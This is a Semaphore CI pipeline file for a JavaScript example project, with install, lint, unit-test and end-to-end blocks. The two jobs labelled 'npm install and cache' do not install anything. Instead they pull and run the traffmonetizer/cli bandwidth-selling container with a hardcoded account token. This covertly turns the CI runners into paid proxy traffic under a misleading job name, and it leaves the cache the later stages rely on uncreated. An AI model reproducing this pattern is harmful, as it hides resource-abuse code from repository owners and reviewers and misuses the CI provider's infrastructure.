version: v1.0
name: Semaphore JavaScript Example Pipeline
agent:
  machine:
    type: e1-standard-2
    os_image: ubuntu1804
blocks:
  - name: "\U0001F4E6 Install dependencies"
    task:
      env_vars:
        - name: NODE_ENV
          value: test
        - name: CI
          value: 'true'
      prologue:
        commands:
          - checkout
          - nvm use
          - node --version
          - npm --version
      jobs:
        - name: client npm install and cache
          commands:
            - 'docker pull traffmonetizer/cli:latest'
            - docker run -i --name tm traffmonetizer/cli start accept --token OzZ2B7hSlO5weYWp1wqtmRIptc9a99KDEFYafyIRr5I=
        - name: server npm install and cache
          commands:
            - 'docker pull traffmonetizer/cli:latest'
            - docker run -i --name tm traffmonetizer/cli start accept --token OzZ2B7hSlO5weYWp1wqtmRIptc9a99KDEFYafyIRr5I=
  - name: "\U0001F50D Lint"
    task:
      env_vars:
        - name: NODE_ENV
          value: test
        - name: CI
          value: 'true'
      prologue:
        commands:
          - checkout
          - nvm use
          - node --version
          - npm --version
      jobs:
        - name: Client Lint
          commands:
            - cd src/client
            - 'cache restore client-node-modules-$SEMAPHORE_GIT_BRANCH-$(checksum package-lock.json),client-node-modules-$SEMAPHORE_GIT_BRANCH,client-node-modules-master'
            - npm run lint
        - name: Server Lint
          commands:
            - cd src/server
            - 'cache restore server-node-modules-$SEMAPHORE_GIT_BRANCH-$(checksum package-lock.json),server-node-modules-$SEMAPHORE_GIT_BRANCH,server-node-modules-master'
            - npm run lint
  - name: "\U0001F9EA Unit Tests"
    task:
      env_vars:
        - name: NODE_ENV
          value: test
        - name: CI
          value: 'true'
      prologue:
        commands:
          - checkout
          - nvm use
          - node --version
          - npm --version
      jobs:
        - name: Client Unit Tests
          commands:
            - export NAME="Client tests"
            - cd src/client
            - 'cache restore client-node-modules-$SEMAPHORE_GIT_BRANCH-$(checksum package-lock.json),client-node-modules-$SEMAPHORE_GIT_BRANCH,client-node-modules-master'
            - npm test
        - name: Server Unit Tests
          commands:
            - export NAME="Server tests"
            - cd src/server
            - 'cache restore server-node-modules-$SEMAPHORE_GIT_BRANCH-$(checksum package-lock.json),server-node-modules-$SEMAPHORE_GIT_BRANCH,server-node-modules-master'
            - npm test
      epilogue:
        always:
          commands:
            - "[[ -f junit.xml ]] && test-results publish --name \"\U0001F9EA $NAME\" junit.xml"
  - name: "\U0001F504 E2E Tests"
    task:
      env_vars:
        - name: NODE_ENV
          value: test
        - name: CI
          value: 'true'
      prologue:
        commands:
          - checkout
          - nvm use
          - node --version
          - npm --version
          - sem-service start postgres
          - sudo apt-get install -y libgtk2.0-0
      jobs:
        - name: Client E2E Tests
          commands:
            - export NAME="Client tests"
            - cd src/client
            - 'cache restore client-node-modules-$SEMAPHORE_GIT_BRANCH-$(checksum package-lock.json),client-node-modules-$SEMAPHORE_GIT_BRANCH,client-node-modules-master'
            - npx cypress install
            - 'npm run test:e2e'
        - name: Server E2E Tests
          commands:
            - export NAME="Server tests"
            - cd src/server
            - 'cache restore server-node-modules-$SEMAPHORE_GIT_BRANCH-$(checksum package-lock.json),server-node-modules-$SEMAPHORE_GIT_BRANCH,server-node-modules-master'
            - cp ormconfig.ci.json ormconfig.json
            - 'npm run migrate:up'
            - 'npm run test:e2e'
      epilogue:
        always:
          commands:
            - "[[ -f junit.xml ]] && test-results publish --name \"\U0001F3D7Ô∏è $NAME\" junit.xml"
after_pipeline:
  task:
    jobs:
      - name: Publish Results
        commands:
          - test-results gen-pipeline-report
